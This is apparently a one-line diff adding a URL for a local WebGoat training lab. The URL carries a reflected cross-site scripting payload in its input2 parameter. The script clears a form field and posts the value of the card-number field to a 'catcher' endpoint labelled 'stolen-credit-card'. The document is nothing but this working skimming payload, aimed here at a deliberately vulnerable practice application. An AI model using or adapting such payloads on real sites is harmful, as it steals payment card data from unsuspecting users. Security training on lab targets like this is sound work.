@@ -1,0 +1,1 @@
+http://localhost:8090/WebGoat/start.mvc#attack/752417971/900?&input2=<SCRIPT>document.getElementsByName("input2")[0].value="";if (document.getElementsByName('input1')[0].value !%3D "4128 3214 0002 1999") {$.post('catcher?PROPERTY=yes%26stolen-credit-card='%2B document.getElementsByName('input1')[0].value);}</SCRIPT>
